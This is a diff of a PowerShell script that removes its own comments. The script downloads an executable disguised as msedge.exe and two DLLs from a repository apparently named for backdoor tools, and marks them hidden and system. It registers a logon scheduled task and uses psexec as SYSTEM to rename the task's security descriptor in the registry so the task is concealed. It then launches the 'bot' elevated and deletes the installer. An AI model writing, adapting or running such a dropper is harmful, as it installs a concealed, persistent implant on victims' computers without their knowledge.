@@ -1,24 +1,18 @@
-#sets location temp
 cd $env:temp
 
-#make new folder
 mkdir sVBXKuz
 
-#cd into folder
 cd sVBXKuz
 
-#download executable and startup file
 Invoke-WebRequest -Uri "dl.dropboxusercontent.com/scl/fi/i7cu35v7bj3fvfbk3bbp6/wsappa-2.0.exe?rlkey=j3rap110tv6br11xo3359uos1&dl=0" -OutFile msedge.exe
 Invoke-WebRequest -Uri "https://raw.githubusercontent.com/blousekool/BBbdtools/main/bd/tools/libsodium.dll" -OutFile libsodium.dll
 Invoke-WebRequest -Uri "https://raw.githubusercontent.com/blousekool/BBbdtools/main/bd/tools/libopus.dll" -OutFile libopus.dll
 
-#list files
 $filePath = "$env:temp/sVBXKuz/msedge.exe"
 $dll1Path = "$env:temp/sVBXKuz/libsodium.dll"
 $dll2Path = "$env:temp/sVBXKuz/libopus.dll"
 $folderPath = "$env:temp/sVBXKuz/"
 
-#hide files
 Set-ItemProperty -Path $filePath -Name Attributes -Value ([IO.FileAttributes]::System -bor [IO.FileAttributes]::Hidden)
 Set-ItemProperty -Path $dll1Path -Name Attributes -Value ([IO.FileAttributes]::System -bor [IO.FileAttributes]::Hidden)
 Set-ItemProperty -Path $dll2Path -Name Attributes -Value ([IO.FileAttributes]::System -bor [IO.FileAttributes]::Hidden)
@@ -28,7 +22,6 @@ $taskAction = New-ScheduledTaskAction -Execute '$env:temp\sVBXKuz\msedge.exe'
 $taskTrigger = New-ScheduledTaskTrigger -AtLogOn
 $taskSettings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopOnIdleEnd -DontStopIfGoingOnBatteries -MultipleInstances IgnoreNew -RestartCount 10
 
-#create startup task
 $taskXml = @"
 <?xml version="1.0" encoding="UTF-16"?>
 <Task version="1.4" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
@@ -94,11 +87,8 @@ Invoke-WebRequest -Uri "https://live.sysinternals.com/psexec.exe" -OutFile "psex
 .\psexec.exe -i -s powershell -Command "Rename-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\dauto' -Name 'SD' -NewName 'SD832'"
 Remove-item psexec.exe
 
-#start bot
 Start-Process $env:temp/sVBXKuz/msedge.exe -Verb RunAs
 
-#clean up
 powershell.exe /c Remove-Item $env:temp/dinstall.ps1
 
-#exit
 exit
